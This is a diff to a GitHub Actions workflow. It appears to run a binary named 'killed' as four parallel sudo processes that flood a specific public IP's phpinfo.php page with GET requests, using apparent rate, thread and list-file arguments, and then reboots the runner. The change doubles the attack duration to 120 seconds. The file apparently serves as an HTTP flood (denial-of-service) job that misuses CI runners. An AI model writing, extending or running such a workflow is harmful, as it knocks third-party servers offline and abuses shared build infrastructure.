@@ -20,7 +20,7 @@ jobs:
           chmod +x killed
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 60 ./killed GET http://185.211.100.89/dashboard/phpinfo.php fres.txt 60 950 10 &
+            sudo timeout 120 ./killed GET http://185.211.100.89/dashboard/phpinfo.php fres.txt 120 950 10 &
             PIDS+=($!)
           done
           
@@ -29,7 +29,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 60
+        run: sleep 120
         
       - name: OK !
         run: sudo reboot
